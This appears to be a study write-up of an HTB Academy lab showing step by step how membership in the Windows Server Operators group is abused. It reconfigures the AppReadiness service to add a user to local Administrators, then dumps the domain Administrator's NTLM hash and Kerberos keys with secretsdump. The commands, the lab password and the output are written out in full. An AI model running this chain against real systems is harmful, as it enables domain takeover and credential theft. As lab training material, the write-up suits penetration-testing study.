# Server Operators

**Server Operators** is a group which allow all members to manage windows servers without needing assignment of Domain Admin privileges

Membership of this group confers the powerful **`SeBackupPrivilege`** and **`SeRestorePrivilege`** privileges and the ability to **control local services.**

### **We will exploit the ability of control local services**

which we will edit service running with system privilege and we will user our privilege in server operators to control this serves to make us `Local Administrator`

***

## **Scanning the AppReadiness Service**

`AppReadiness` is a service found in windows

we found this service running with system privilege

```powershell
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        **SERVICE_START_NAME : LocalSystem
        
 # LocalSystem is NT AUTHORITY\SYSTEM**
```

## **Checking Service Permissions with PsService**

we use it to check server operators permissions on the service.

`PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

> We found our group has a full access

```powershell
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        **[ALLOW] BUILTIN\Server Operators
                All**
```

## **Checking Local Admin Group Membership**

to check our account is not present in this group

```powershell
 C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

## **Modifying the Service Binary Path**

we will change binary path to execute command to add our current user to the administrators group

```powershell
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

### **Starting the Service**

Starting the service fails, which is expected.

```powershell
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### **Confirming Local Admin Group Membership**

If we check the membership of the administrators group, we see that the command was executed successfully.

```powershell
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

### **Confirming Local Admin Access on Domain Controller**

From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

```powershell
irix@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

### **Retrieving NTLM Password Hashes from the Domain Controller**

```powershell
irix@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```
